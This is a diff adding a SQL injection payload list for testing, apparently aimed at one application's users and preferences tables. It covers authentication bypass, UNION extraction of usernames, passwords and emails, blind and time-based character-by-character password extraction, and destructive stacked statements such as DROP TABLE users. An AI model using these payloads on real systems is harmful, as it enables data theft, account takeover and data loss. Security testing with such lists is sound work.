@@ -1,0 +1,139 @@
+# SQL Injection Payloads for Testing
+# Each line contains a payload that can be used in the username or search field
+# Updated with Advanced SQL Injection Techniques
+
+# ========== BASIC AUTHENTICATION BYPASS ==========
+
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+admin' #
+' OR 1=1 --
+' OR 1=1#
+') OR '1'='1
+') OR ('1'='1
+" OR "1"="1
+" OR "1"="1" --
+' OR 'a'='a
+admin' OR '1'='1
+' OR ''='
+
+# ========== STACKED STATEMENTS (SQLite) ==========
+# These allow multiple SQL statements to be executed
+
+alice'; DROP TABLE users; --
+bob'; DELETE FROM users WHERE username='admin'; --
+charlie'; UPDATE users SET password='hacked' WHERE username='admin'; --
+'; INSERT INTO users (username, password, email) VALUES ('hacker', 'evil', 'hacker@evil.com'); --
+test'; CREATE TABLE malicious (id INTEGER); --
+'; DELETE FROM user_preferences; --
+
+# ========== UNION-BASED DATA EXFILTRATION ==========
+
+# Step 1: Column count detection
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+' ORDER BY 4 --
+' ORDER BY 5 --
+
+# Step 2: Find injectable columns
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL, NULL --
+
+# Step 3: Extract data
+' UNION SELECT id, username, password, email FROM users --
+' UNION SELECT id, username, password, email FROM users WHERE '1'='1
+alice' UNION SELECT id, username, password, email FROM users --
+' UNION SELECT '1', '2', '3', '4
+' UNION SELECT id, username, email, bio FROM users --
+
+# Step 4: Database metadata extraction
+' UNION SELECT NULL, NULL, sqlite_version(), NULL --
+' UNION SELECT NULL, name, sql, NULL FROM sqlite_master WHERE type='table' --
+' UNION SELECT NULL, NULL, GROUP_CONCAT(name), NULL FROM sqlite_master WHERE type='table' --
+
+# ========== SECOND-ORDER SQL INJECTION ==========
+# These payloads are saved in one request and executed in another
+
+# Payloads to save as display_name in save_preference endpoint
+admin' OR '1'='1' --
+bob' UNION SELECT id, username, password, email FROM users --
+' OR '1'='1
+alice'; DROP TABLE users; --
+test' AND 1=1 --
+
+# ========== BOOLEAN-BASED BLIND SQL INJECTION ==========
+# Extract data character by character using TRUE/FALSE conditions
+
+# Basic true/false tests
+admin' AND '1'='1
+admin' AND '1'='2
+admin' AND 1=1 --
+admin' AND 1=2 --
+
+# Password length detection
+admin' AND LENGTH(password)=1 --
+admin' AND LENGTH(password)=10 --
+admin' AND LENGTH(password)=12 --
+admin' AND LENGTH(password)>10 --
+
+# Character-by-character extraction (password)
+admin' AND SUBSTR(password,1,1)='a' --
+admin' AND SUBSTR(password,1,1)='b' --
+admin' AND SUBSTR(password,1,1)='p' --
+admin' AND SUBSTR(password,2,1)='a' --
+admin' AND SUBSTR(password,3,1)='s' --
+
+# Character-by-character extraction (email)
+admin' AND SUBSTR(email,1,1)='a' --
+admin' AND SUBSTR(email,7,1)='@' --
+
+# Check if user exists
+admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 --
+bob' AND (SELECT COUNT(*) FROM users WHERE username='alice')>0 --
+
+# ========== TIME-BASED BLIND SQL INJECTION (SQLite) ==========
+# Use timing delays to infer TRUE/FALSE conditions
+
+# Basic time-based tests (using randomblob for delay)
+' OR (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) --
+' OR (SELECT CASE WHEN (1=2) THEN randomblob(100000000) ELSE 1 END) --
+
+# Check if admin user exists (with delay)
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')=1 THEN randomblob(100000000) ELSE 1 END) --
+
+# Extract password first character using timing
+' OR (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN randomblob(100000000) ELSE 1 END) --
+' OR (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='p' THEN randomblob(100000000) ELSE 1 END) --
+
+# Alternative timing method (recursive query - causes delay)
+' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)) > 0 --
+
+# ========== SEARCH-BASED SQL INJECTION ==========
+
+%' OR '1'='1
+test' OR '1'='1' --
+' OR 1=1 --
+%' UNION SELECT id, username, password, email FROM users --
+%' OR username LIKE '%
+
+# ========== COMMENT INJECTION ==========
+
+admin'/*
+admin'--
+admin'#
+admin'-- -
+' OR '1'='1' -- comment
+' OR '1'='1' #
+
+# ========== ERROR-BASED SQL INJECTION ==========
+
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' UNION SELECT NULL, NULL, sqlite_version(), NULL --
+' AND 1=(SELECT COUNT(*) FROM nonexistent_table) --
+' UNION SELECT table_name FROM information_schema.tables --
